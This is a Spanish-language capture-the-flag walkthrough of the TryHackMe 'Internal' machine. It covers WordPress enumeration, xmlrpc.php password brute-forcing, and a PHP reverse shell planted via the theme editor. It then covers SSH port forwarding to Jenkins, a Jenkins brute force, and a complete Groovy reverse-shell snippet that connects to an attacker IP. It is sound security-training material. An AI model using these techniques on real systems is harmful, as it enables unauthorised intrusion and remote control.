---
layout: single
title: Máquina Internal - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La última máquina de esta etapa es similar a la anterior; se trata de un challenge para poner en práctica todo lo aprendido hasta el momento. Se trata de una máquina Linux con, al parecer, solo un camino para ser comprometida."
date: 2022-07-10
classes: wide
header:
  teaser: /assets/images/internal/portada.jpg
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - wordpress
  - brute force
  - xmlrpc
  - reverse shell
  - horizontal pivoting
  - docker
  - jenkins
  - scripting
  - port forwarding
---

# Introducción
La máquina se encuentra en [TryHackMe](https://tryhackme.com/room/overpass2hacked). Se trata de una máquina challenge, donde se nos plantea un escenario realista de un ambiente de pruebas, el cual requiere de un análisis de vulnerabilidades previo a su lanzamiento al público. No se nos proporciona mayor información, dado que es una prueba de tipo black box, solo que debemos obtener las dos flags, tanto de user como de root para completar el desafío.

# Reconocimiento
Por medio de una traza ICMP detectamos el sistema remoto. Por el TTL (64) sabemos que se trata de un sistema Linux.

![1]

Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -p- --open -T5 -Pn -n 10.10.117.219 -oG allPorts

![2]

Vemos que hay dos puertos habilitados: el SSH (22) y el HTTP (80).

Si realizamos un escaneo exhaustivo en busca de más información sobre estos puertos, la consulta no nos devolverá mayor información relevante:

    nmap -sC -sV -p22,80 10.10.117.219 -oN targeted

![3]

# Servicio HTTP
Si accedemos por medio de un navegador, lo primero con lo que nos encontramos es con una página por defecto del servidor Apache.

![4]

Si intentamos realizar un fuzzeo al server en busca de directorios ocultos, nos encontraremos con lo siguiente:

    wfuzz -c --hc=404 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.117.219/FUZZ

- blog
- wordpress
- phpmyadmin

![5]

Las primeras dos hacen referencia a lo mismo, un blog de Wordpress vacío que solo se encuentra en su estado por defecto. Si accedemos al directorio *blog*, nos encontraremos con la siguiente página desconfigurada:

![6]

Esto se debe a que las referencias del sitio web redirigen a un nombre de dominio **internal.thm**, por lo cual deberemos agregarlo a nuestro */etc/hosts* para poder visualizar correctamente la página:

![7]

![8]

Intentamos acceder al *phpmyadmin*, y lo que veremos es un panel de logueo de este servicio. Lo dejaremos de momento ya que no contamos con credenciales para intentar acceder.

![9]

# Wordpress
Lo primero que debemos hacer al momento de querer comprometer un *Wordpress* (o al menos lo que yo suelo hacer) es enumerar en busca de plugins para ver si alguno cuenta con alguna vulnerabilidad. Para ello, nuevamente fuzzeamos con ayuda del diccionario de SecList: *wp-plugins.fuzz.txt*

    wfuzz -c --hc=404 -t 50 -w /usr/share/wordlists/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.10.117.219/blog/FUZZ

![10]

Por desgracia, el fuzzeo nos indica que este Wordpress no cuenta con plugins instalados, por lo que el acercamiento por este vector no es válido. Ahora intentamos hacer una enumeración básica de usuarios con ayuda del panel de logueo.

Recordemos que el panel de logueo de Wordpress es muy útil para enumerar usuarios válidos, ya que, aunque no conozcamos la contraseña, podemos saber si el usuario existe, dado que un logueo erróneo nos regresa un mensaje de error que dice: *"The password you entered for the username admin is incorrect"*, sugiriendo que el usuario existe, pero que la contraseña no es válida.

Así, descubrimos que el sistema cuenta con un usuario admin (esto fue mera adivinanza, pero hablamos de credenciales por defecto que hemos visto con anterioridad; casi siempre hay un usuario admin).

![11]

En este punto queremos descubrir la contraseña para el usuario **admin**, y para ello podemos realizar un ataque de fuerza bruta por medio del panel de logueo o por medio del archivo **xmlrpc.php**. Este último es una especie de API que nos permite interactuar con Wordpress, y para nuestros propósitos, nos permite saber si una combinación de usuario y contraseña son válidos en el sistema. Este último es más rápido que el primero, por lo que es la opción más viable, pero para elle debemos ver si el archivo es accesible:

    /RUTA DEL WORDPRESS/xmlrpc.php

![12]

Si obtenemos el mensaje: *Server accepts POST requests only* entonces vamos bien. Eso quiere decir que el archivo es accesible, y solo debemos mandar las consultas por medio de peticiones POST.

# Ataque de fuerza bruta a xmlrpc.php
Para iniciar, mandamos una petición al BurpSuite de acceso al *xmlrpc.php*:

![13]

Mandamos esta petición al Repeater para poder modificar las peticiones. Iniciamos por cambiar el modo de petición de GET a POST. Posteriormente, agregamos a la data del paquete el siguiente código xml de consulta:

    <methodCall>
        <methodName>
            system.listMethods
        </methodName>
        <params>
        </params>
    </methodCall>

![14]

Como podemos observar, esta consulta nos devuelve un listado de los métodos permitidos por esta API. Para corroborar que podamos ejecutarlos, mandamos a llamar a la función de demostración llamada *Hello*, la cual simplemente nos devuelve una cadena con dicho saludo.

    <methodCall>
        <methodName>
            demo.sayHello
        </methodName>
        <params>
        </params>
    </methodCall>

![15]

Esta ejecución nos devuelve una cadena con el texto **Hello**, por lo tanto, podemos ejecutar funciones en esta API. Para poder llevar a cabo el ataque de fuerza bruta, mandamos a llamar a la instrucción **wp.getUsersBlogs**:

    <methodCall>
		<methodName>wp.getUsersBlogs</methodName> 
		<param><value>{username}</value></param>
		<param><value>{password}</value></param>
	</methodCall>

En este caso no importa qué datos le mandemos, lo que necesitamos ver es si es posible ejecutarlo y el mensaje de respuesta a una petición errónea. El sistema nos regresa un mensaje que dice: *Incorrect username or password*.

![16]

Listo, ahora solo necesitamos un script que haga estas peticiones con ayuda de un diccionario y que revise la respuesta recibida para corroborar si la credencial es válida o no. Para llevarlo a cabo, existe un script llamado [Wordpress-XMLRPC-Brute-Force-Exploit](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit), sin embargo, al momento de ejecutarlo recibimos un error de que la petición no fue construida de manera correcta.

![17]

No me interesó de momento analizar el código fuente para corregirlo y hacerlo coincidir con nuestro caso particular (que técnicamente no debería existir, dado que es un procedimiento estándar, pero nunca se sabe cuando se trata de código ajeno); por lo tanto, decidí desempolvar el teclado y regresar a programar mis propios scripts para automatizar este ataque.

Hace tiempo había realizado una máquina llamada [Blog](https://tryhackme.com/room/blog) en TryHackMe, sin embargo, no tuve oportunidad de escribir el Walkthrough en su momento. SPOILER ALERT: Esta máquina tiene un approach parecido de atacar el *xmlrpc.php*, y en aquél entonces había programado un script basado en su mayor parte en lo que el hacker S4vitar mostró en un directo en vivo en Twitch.

![18]

Volví a programarlo, arreglar algunos fallos que tenía, y lo subí a [un repositorio](https://github.com/blu3ming/XMLRPC-Brute-Force) en GitHub por si quieres usarlo. Básicamente, envía peticiones POST con las credenciales proporcionadas de forma automatizada y revisa la respuesta en busca de una contraseña válida para el usuario (o usuarios) proporcionado(s). El usuario que se probó es **admin** y el diciconario de contraseñas fue el **rockyou.txt**:

Nota: El script usa Python 2 y evidentemente acepta Pull Request si tienes alguna mejora que proponer.

    python2 xmlrpc_users.py

![19]

Después de pasado un tiempo, vemos que el script logra detectar una credencial válida:

    admin:my2boys

Las ingresamos en el panel de logueo de Wordpress logrando acceder. Al entrar, el sistema nos mostrará un mensaje de alerta con un recordatorio de verificación de correo electrónico; solo debemos dar clic en *Remind me later*.

![20]

# Reverse shell en Wordpress
Para lograr ingresar al servidor, podemos añadir una reverse shell en PHP desde el panel de administración de un Wordpress comprometido. Para ello, nos dirigimos al apartado Appearance -> Theme Editor (o solo Editor en algunas versiones):

![21]

Desde aquí, se recomienda seleccionar del lado derecho el archivo del 404.php. Si queremos ser más discretos, solo deberíamos modificar un poco el archivo existente para añadir una reverse shell; sin embargo, lo borré todo y añadí la [reverse shell en php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) que venimos usando máquinas atrás.

![22]

Recuerda modificar la IP y puerto de escucha en el archivo. Con un netcat a la escucha, solo resta acceder a la página desde un navegador:

    RUTA DEL WORDPRESS/wp-content/themes/twentyseventeen/404.php

Sin embargo, al momento de acceder a esta página no pasó nada. Lo intenté un par de ocasiones sin éxito alguno. Fue entonces que decidí emplear otro archivo para agregar la reverse shell, y para no errarle ya, lo coloqué en lugar del index del sitio.

ALERTA: Esto, evidentemente, no debe hacerse nunca en un pentesting real, dado que técnicamente nos cargamos el sitio web por completo.

Aún así, esto sí funcionó y me devolvió una reverse shell. Al haber modificado el index, solo tuve que acceder al directorio **blog** para obtener la shell.

![23]

![24]

# Pivoting horizontal
Al entrar al sistema lo haremos como el usuario **www-data**. Haciendo una enumeración del servidor, veremos que en el directorio *home* hay una carpeta de un usuario llamado **aubreanna**, al cual no tenemos acceso.

![25]

Esto es un indicativo de que debemos escalar primero a este usuario para poder continuar. Haciendo una enumeración básica se intentó listar permisos **sudo** (sin éxito por no contar con una contraseña de usuario) y binarios **SUID** (sin alguno con un vector posible).

Posteriormente, enumeré archivos del sistema, enontrándome en el directorio */opt* con un archivo de texto llamado *wp-save.txt*

![26]

Como podemos observar, este archivo cuenta con las credenciales del usuario que estamos buscando, **aubreanna**; por lo tanto hacemos un cambio de user en el sistema proporcionando las credenciales.

![27]

Hemos logrado cambiar de usuario, por lo tanto, accedemos a su directorio personal para encontrarnos con la primera flag solicitada.

# Escalada de privilegios
Ya habiendo escalado a un usuario dentro del sistema, procedemos a escalar privilegios para obtener la última flag. Comenzamos enumerando permisos sudo (ya que contamos con la contraseña del usuario), encontrándonos con que **aubreanna** no puede ejecutar *sudo* en el servidor.

![28]

Igualmente listamos binarios SUID, sin encontrar nada prometedor. Al haber listado el directorio del usuario al momento de buscar la flag, vemos que hay un archivo llamado **jenkins.txt**:

![29]

Esto nos proporciona la siguiente pista, indicándonos que en el sistema corre un servidor **Jenkins** de manera interna en un **docker** en el puerto 8080. Esto podemos corroborarlo porque la IP no parece estar dentro de la subred del servidor: 172.17.0.2.

Si listamos los puertos en uso con ayuda de **netstat**, veremos que efectivamente existe el 8080 de forma interna. Nuestro siguiente paso será hacer un **Port Forwarding** para poder analizar dicho servicio en nuestra máquina.

![30]

# Port Forwarding
Como contamos con las credenciales de **aubreanna**, podemos realizar este port forwarding con ayuda de SSH directamente:

    ssh -L 8090:localhost:8080 aubreanna@10.10.117.219

Recordemos que el primer puerto en el comando indica el que estará abierto en nuestra máquina replicando el remoto, y como a veces el 8080 suele estar ocupado, nos movemos al 8090 para no errarle; al final, recordemos que el puerto local no importa, siempre y cuando lo tengamos en mente.

![31]

Ya con el puerto replicado, podemos acceder al localhost desde un navegador para observar el famoso **Jenkins** que vimos en el servidor.

![32]

# Ataque de fuerza bruta a Jenkins
Intenté acceder a Jenkins con todas las credenciales con las que contamos hasta este momento, y ninguna fue válida. Por lo tanto, mi siguiente pensamiento fue intentar nuevamente un ataque de fuerza bruta. Para ello, podemos emplear **Hydra** (mmm, no me gusta mucho usarlo); sin embargo, al menos para mí, no funcionó.

![33]

Y como ya andaba inspirado, decidí nuevamente sacar mis conocimientos de Python y programar un script que nos ayude a automatizar este procedimiento. Para ello, primero capturé una petición con ayuda de BurpSuite para saber el endpoint correcto y data que envía el paquete. Probé primero un script que manda una sola petición para ver la respuesta, encontrándome con que esta contiene la cadena: *Invalid usernae or password*.

![34]

![35]

Agregué todo esto a la petición que lleva a cabo **requests** y automaticé la toma de contraseñas del **rockyou.txt** para intentar encontrar una credencial válida.

De igual manera, puedes emplear este script que subí a [un repositorio](https://github.com/blu3ming/Jenkins-Brute-Force) en GitHub; emplea Python 2 y está diseñado para recibir desde consola la URL, el diccionario que quieras emplear, y el usuario a probar.

![36]

    python2 jenkins_bf.py http://localhost:8090/j_acegi_security_check /usr/share/wordlists/rockyou.txt admin

![37]

Como podemos observar, el script nos devuelve una credencial válida:

    admin:spongebob

Por lo tanto, las introducimos en el panel de logueo, logrando acceder al panel de administración.

![38]

# Reverse shell desde Jenkins
Según nuestras notas, para poder llevar a cabo ejecución de comandos, podemos emplear el **Script Console** que se encuentra en el apartado de **Manage Jenkins**.

![39]

Si suponemos que el servicio Jenkins está siendo ejecutado por el usuario root, podemos suponer también que solo necesitamos convertir en SUID a la bash para elevar privilegios.

![40]

Sin embargo, al realizar esto, veremos que no hay ningún cambio. Esto se da debido a un malentendido de nuestra ubicación. Recordemos que estamos dentro de Jenkins, y este está corriendo dentro de un docker en el servidor, por lo que cualquier cambio que queramos hacer solo se reflejará en el docker, no en el sistema anfitrión.

![41]

Por lo tanto, deberemos llevar a cabo otro método que nos permita obtener una reverse shell. Para ello, podemos incluir el siguiente código en la consola:

    String host=”10.10.119.193”;
    int port=443;
    String cmd=”/bin/bash”;
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Este código se divide en cuatro apartados:
- El host al cual devolverá la reverse shell (es decir, nuestra IP de atacante).
- El puerto que estará a la escucha (nuestro también).
- La shell que regresará el comando (en el caso de Windows, será la cmd.exe; en Linux, la bash).
- El comando que entabla el socket para obtener la reverse shell.

Una explicación más detallada sobre este procedimiento puede ser consultada en [este blog](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6).

![42]

Al momento de correrlo, y estar en escucha con netcat, veremos que logramos obtener una shell dentro del docker de Jenkins.

![43]

# Enumerando el docker y escalada a root
Dado que estamos dentro de un docker, no nos queda más que intentar enumerarlo con la esperanza de encontrar una contraseña o vector de ataque que nos permita finalmente escalar a root en el servidor anfitrión. Por fortuna, nuevamente hay un archivo dentro del directorio **/opt** llamado **note.txt**.

![44]

Como podemos observar, este archivo contiene las credenciales del usuario root. Nuevamente, en este punto olvidé dónde me encontraba y quise cambiar de usuario dentro del docker, sin éxito evidentemente.

![45]

Habiendo reaccionado, intenté cambiar de usuario ahora en el servidor original (la consola de SSH que conseguimos previamente con el usuario **aubreanna**), logranto escalar privilegios y obteniendo la última flag del sistema.

![46]

[1]:/assets/images/internal/1.png
[2]:/assets/images/internal/2.png
[3]:/assets/images/internal/3.png
[4]:/assets/images/internal/4.png
[5]:/assets/images/internal/5.png
[6]:/assets/images/internal/6.png
[7]:/assets/images/internal/7.png
[8]:/assets/images/internal/8.png
[9]:/assets/images/internal/9.png
[10]:/assets/images/internal/10.png
[11]:/assets/images/internal/11.png
[12]:/assets/images/internal/12.png
[13]:/assets/images/internal/13.png
[14]:/assets/images/internal/14.png
[15]:/assets/images/internal/15.png
[16]:/assets/images/internal/16.png
[17]:/assets/images/internal/17.png
[18]:/assets/images/internal/18.png
[19]:/assets/images/internal/19.png
[20]:/assets/images/internal/20.png
[21]:/assets/images/internal/21.png
[22]:/assets/images/internal/22.png
[23]:/assets/images/internal/23.png
[24]:/assets/images/internal/24.png
[25]:/assets/images/internal/25.png
[26]:/assets/images/internal/26.png
[27]:/assets/images/internal/27.png
[28]:/assets/images/internal/28.png
[29]:/assets/images/internal/29.png
[30]:/assets/images/internal/30.png
[31]:/assets/images/internal/31.png
[32]:/assets/images/internal/32.png
[33]:/assets/images/internal/33.png
[34]:/assets/images/internal/34.png
[35]:/assets/images/internal/35.png
[36]:/assets/images/internal/36.png
[37]:/assets/images/internal/37.png
[38]:/assets/images/internal/38.png
[39]:/assets/images/internal/39.png
[40]:/assets/images/internal/40.png
[41]:/assets/images/internal/41.png
[42]:/assets/images/internal/42.png
[43]:/assets/images/internal/43.png
[44]:/assets/images/internal/44.png
[45]:/assets/images/internal/45.png
[46]:/assets/images/internal/46.png